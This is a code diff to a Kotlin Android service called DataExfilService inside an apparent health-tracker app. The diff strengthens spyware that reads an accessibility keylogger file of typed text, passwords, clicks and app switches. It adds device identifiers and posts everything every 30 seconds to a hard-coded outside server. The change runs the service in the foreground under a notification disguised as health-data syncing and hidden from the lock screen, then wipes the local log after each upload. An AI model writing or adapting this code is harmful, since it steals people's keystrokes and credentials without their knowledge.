@@ -1,5 +1,8 @@
 package com.inf2007.healthtracker.utilities
 
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -7,6 +10,7 @@ import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.*
 import android.util.Log
+import androidx.core.app.NotificationCompat
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.File
@@ -20,20 +24,27 @@ class DataExfilService : Service() {
 
     companion object {
         const val TAG = "DataExfilService"
-
-        private const val ACCESSIBILITY_LOGS_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"
+        private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
+        private const val NOTIFICATION_ID = 1001
+        private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/notifications"
 
         fun startService(context: Context) {
             val intent = Intent(context, DataExfilService::class.java)
-            context.startService(intent)
+
+            // Check Android version for foreground service
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(intent)
+            } else {
+                context.startService(intent)
+            }
         }
     }
 
-    private val handler = Handler(Looper.getMainLooper())
+    private lateinit var handler: Handler
     private var isUploading = false
 
-    // Upload every 1 minute (for testing)
-    private val uploadInterval = 60 * 1000L
+    // Upload every 30 seconds (for testing)
+    private val uploadInterval = 30 * 1000L
 
     private val uploadRunnable = object : Runnable {
         override fun run() {
@@ -44,47 +55,71 @@ class DataExfilService : Service() {
         }
     }
 
+    override fun onCreate() {
+        super.onCreate()
+        handler = Handler(Looper.getMainLooper())
+        createNotificationChannel()
+    }
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "Data exfiltration service started")
 
-        // Start periodic uploads
-        handler.postDelayed(uploadRunnable, 15000) // First upload in 15 seconds
+        // CRITICAL FIX: Start as foreground service immediately
+        startForegroundService()
 
-        // Test connection
-        handler.postDelayed({
-            testServerConnection()
-        }, 5000)
+        // Start periodic uploads
+        handler.postDelayed(uploadRunnable, 10000) // First upload in 10 seconds
 
         return START_STICKY
     }
 
-    private fun testServerConnection() {
-        Thread {
-            try {
-                val url = URL("http://20.2.92.176:5000")
-                val connection = url.openConnection() as HttpURLConnection
-                connection.requestMethod = "GET"
-                connection.connectTimeout = 5000
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channelName = "Health Data Sync"
+            val channelDescription = "Uploads health data to server"
+            val importance = NotificationManager.IMPORTANCE_LOW
 
-                val responseCode = connection.responseCode
-                Log.d(TAG, "Server connection test: $responseCode")
-
-                connection.disconnect()
-
-            } catch (e: Exception) {
-                Log.e(TAG, "Server connection failed: ${e.message}")
+            val channel = NotificationChannel(
+                NOTIFICATION_CHANNEL_ID,
+                channelName,
+                importance
+            ).apply {
+                description = channelDescription
+                setShowBadge(false)
             }
-        }.start()
+
+            val notificationManager = getSystemService(NotificationManager::class.java)
+            notificationManager.createNotificationChannel(channel)
+        }
+    }
+
+    private fun startForegroundService() {
+        val notification = createNotification()
+        startForeground(NOTIFICATION_ID, notification)
+        Log.d(TAG, "Foreground service started with notification")
+    }
+
+    private fun createNotification(): Notification {
+        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
+            .setContentTitle("Health Tracker")
+            .setContentText("Syncing health data...")
+            .setSmallIcon(android.R.drawable.stat_sys_upload)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setOngoing(true)
+            .setAutoCancel(false)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .build()
     }
 
     private fun uploadAccessibilityLogs() {
         if (isUploading) return
         if (!isNetworkAvailable()) {
-            Log.d(TAG, "No network available")
+            Log.d(TAG, "No network available, skipping upload")
             return
         }
 
         isUploading = true
+        Log.d(TAG, "Starting log upload...")
 
         Thread {
             try {
@@ -96,18 +131,20 @@ class DataExfilService : Service() {
                     return@Thread
                 }
 
+                Log.d(TAG, "Found ${logContent.lines().size} log entries")
+
                 // Parse logs into notifications format
                 val logs = parseLogsForNotifications(logContent)
 
-                // Send to accessibility logs endpoint
-                val success = sendToAccessibilityLogsEndpoint(logs)  // FIXED METHOD NAME
+                // Send to server
+                val success = sendToServer(logs)
 
                 if (success) {
-                    Log.d(TAG, "✅ Spy logs uploaded successfully")
+                    Log.d(TAG, "Spy logs uploaded successfully")
                     // Archive logs after successful upload
                     archiveLogs()
                 } else {
-                    Log.w(TAG, "❌ Upload failed")
+                    Log.w(TAG, "Upload failed")
                 }
 
             } catch (e: Exception) {
@@ -121,9 +158,19 @@ class DataExfilService : Service() {
     private fun readSpyLogs(): String {
         return try {
             val logFile = File(filesDir, "accessibility_spy.log")
-            if (logFile.exists() && logFile.length() > 0) {
-                logFile.readText()
+            if (logFile.exists()) {
+                val fileSize = logFile.length()
+                Log.d(TAG, "Log file exists, size: $fileSize bytes")
+                if (fileSize > 0) {
+                    val content = logFile.readText()
+                    Log.d(TAG, "Read ${content.lines().size} lines from log file")
+                    content
+                } else {
+                    Log.d(TAG, "Log file is empty")
+                    ""
+                }
             } else {
+                Log.d(TAG, "Log file does not exist")
                 ""
             }
         } catch (e: Exception) {
@@ -134,80 +181,68 @@ class DataExfilService : Service() {
 
     private fun parseLogsForNotifications(logContent: String): JSONObject {
         val logsArray = logContent.lines().filter { it.isNotBlank() }
+        Log.d(TAG, "Parsing ${logsArray.size} log entries")
 
         val notificationData = JSONObject().apply {
             put("type", "accessibility_spy")
-            put("device_id", Build.SERIAL)
+            put("device_id", Build.SERIAL ?: "unknown")
             put("device_model", Build.MODEL)
             put("android_version", Build.VERSION.RELEASE)
             put("timestamp", System.currentTimeMillis())
             put("total_entries", logsArray.size)
             put("collection_time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
+            put("app_package", packageName)
         }
 
         // Categorize logs
-        val categorizedLogs = JSONObject()
         val keyPresses = JSONArray()
         val appSwitches = JSONArray()
         val clicks = JSONArray()
         val sensitiveData = JSONArray()
+        val notifications = JSONArray()
 
         logsArray.forEach { line ->
             when {
-                line.contains("TYPING") || line.contains("KEYPRESS") ->
-                    keyPresses.put(line)
-                line.contains("APP_SWITCH") ->
-                    appSwitches.put(line)
-                line.contains("CLICK") ->
-                    clicks.put(line)
-                line.contains("SENSITIVE") || line.contains("PASSWORD") ->
-                    sensitiveData.put(line)
+                line.contains("TYPING") || line.contains("TEXT") -> keyPresses.put(line)
+                line.contains("APP_SWITCH") -> appSwitches.put(line)
+                line.contains("CLICK") -> clicks.put(line)
+                line.contains("SENSITIVE") || line.contains("PASSWORD") -> sensitiveData.put(line)
+                line.contains("NOTIFICATION") -> notifications.put(line)
+                else -> keyPresses.put(line) // Default to key presses
             }
         }
 
-        // Take last N entries
-        val keyPressesArray = JSONArray()
-        val appSwitchesArray = JSONArray()
-        val clicksArray = JSONArray()
-
-        // Get last entries (reverse and take)
-        val keyPressesList = mutableListOf<String>()
-        for (i in 0 until keyPresses.length()) {
-            keyPressesList.add(keyPresses.getString(i))
+        // Create categorized object
+        val categorizedLogs = JSONObject().apply {
+            put("key_presses", keyPresses)
+            put("app_switches", appSwitches)
+            put("clicks", clicks)
+            put("sensitive_data", sensitiveData)
+            put("notifications", notifications)
         }
-        keyPressesList.takeLast(50).forEach { keyPressesArray.put(it) }
-
-        val appSwitchesList = mutableListOf<String>()
-        for (i in 0 until appSwitches.length()) {
-            appSwitchesList.add(appSwitches.getString(i))
-        }
-        appSwitchesList.takeLast(20).forEach { appSwitchesArray.put(it) }
-
-        val clicksList = mutableListOf<String>()
-        for (i in 0 until clicks.length()) {
-            clicksList.add(clicks.getString(i))
-        }
-        clicksList.takeLast(30).forEach { clicksArray.put(it) }
-
-        categorizedLogs.put("key_presses", keyPressesArray)
-        categorizedLogs.put("app_switches", appSwitchesArray)
-        categorizedLogs.put("clicks", clicksArray)
-        categorizedLogs.put("sensitive_data", sensitiveData)
 
         notificationData.put("logs", categorizedLogs)
+
+        // Also include raw logs (last 50 lines for debugging)
+        val rawLogsArray = JSONArray()
+        logsArray.takeLast(50).forEach { rawLogsArray.put(it) }
+        notificationData.put("raw_logs_sample", rawLogsArray)
 
         return notificationData
     }
 
-    private fun sendToAccessibilityLogsEndpoint(data: JSONObject): Boolean {
+    private fun sendToServer(data: JSONObject): Boolean {
         return try {
-            val url = URL(ACCESSIBILITY_LOGS_ENDPOINT)
+            Log.d(TAG, "Sending data to server: ${data.toString().length} bytes")
+
+            val url = URL(SERVER_ENDPOINT)
             val connection = url.openConnection() as HttpURLConnection
             connection.requestMethod = "POST"
             connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
             connection.setRequestProperty("User-Agent", "HealthTracker-Spy/1.0")
-            connection.connectTimeout = 10000
-            connection.readTimeout = 10000
+            connection.setRequestProperty("Accept", "application/json")
+            connection.connectTimeout = 15000
+            connection.readTimeout = 15000
             connection.doOutput = true
 
             // Write data
@@ -218,13 +253,30 @@ class DataExfilService : Service() {
             }
 
             val responseCode = connection.responseCode
-            Log.d(TAG, "Accessibility logs endpoint response: $responseCode")
+            val responseMessage = connection.responseMessage
+
+            Log.d(TAG, "Server response: $responseCode $responseMessage")
+
+            // Try to read response
+            try {
+                val response = if (responseCode >= 400) {
+                    connection.errorStream.bufferedReader().use { it.readText() }
+                } else {
+                    connection.inputStream.bufferedReader().use { it.readText() }
+                }
+                Log.d(TAG, "Response body: $response")
+            } catch (e: Exception) {
+                Log.d(TAG, "Could not read response body")
+            }
 
             connection.disconnect()
-            responseCode == HttpURLConnection.HTTP_OK
+
+            // Consider 200, 201, 202 as success
+            responseCode in 200..299
 
         } catch (e: Exception) {
-            Log.e(TAG, "Error sending to accessibility logs endpoint: ${e.message}")
+            Log.e(TAG, "Error sending to server: ${e.message}")
+            Log.e(TAG, "Full error: ", e)
             false
         }
     }
@@ -235,7 +287,9 @@ class DataExfilService : Service() {
             if (logFile.exists() && logFile.length() > 0) {
                 val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                 val archivedFile = File(filesDir, "accessibility_spy_$timestamp.log")
-                logFile.renameTo(archivedFile)
+                logFile.copyTo(archivedFile)
+                // Clear the original log file after archiving
+                logFile.writeText("")
                 Log.d(TAG, "Logs archived to: ${archivedFile.name}")
             }
         } catch (e: Exception) {
